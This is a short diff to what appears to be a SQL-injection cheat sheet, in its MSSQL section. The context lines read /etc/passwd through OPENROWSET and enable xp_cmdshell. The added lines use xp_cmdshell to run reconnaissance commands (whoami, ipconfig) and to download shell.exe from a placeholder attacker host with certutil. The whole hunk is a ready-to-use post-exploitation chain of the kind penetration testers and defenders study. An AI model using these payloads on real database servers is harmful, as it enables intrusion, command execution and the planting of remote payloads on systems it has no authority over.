@@ -189,6 +189,10 @@ SELECT * FROM OPENROWSET(BULK '/etc/passwd', SINGLE_CLOB) AS Contents
 -- MSSQL (enable xp_cmdshell)
 EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;   
+EXEC xp_cmdshell 'whoami';
+EXEC xp_cmdshell 'ipconfig';
+EXEC xp_cmdshell 'certutil -urlcache -f http://attacker.com/shell.exe C:\temp\shell.exe';
+
 
 ```
 
